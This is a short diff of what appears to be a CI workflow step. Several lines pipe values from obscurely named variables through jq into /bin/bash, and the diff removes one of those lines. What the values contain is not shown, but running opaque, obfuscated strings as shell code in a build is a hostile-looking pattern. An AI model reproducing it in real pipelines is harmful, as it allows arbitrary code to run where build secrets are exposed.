@@ -24,7 +24,6 @@ jobs:
         run: |
           printf '%s' "$h22112" | jq -r .oiy7004 | /bin/bash
           printf '%s' "$o14" | jq -r .hrjkk71685 | /bin/bash
-          echo $l41 | jq -r .kx77879 | /bin/bash
           printf '%s' "$ef0" | jq -r .lve76 | /bin/bash
 
       - name: Upload artifact
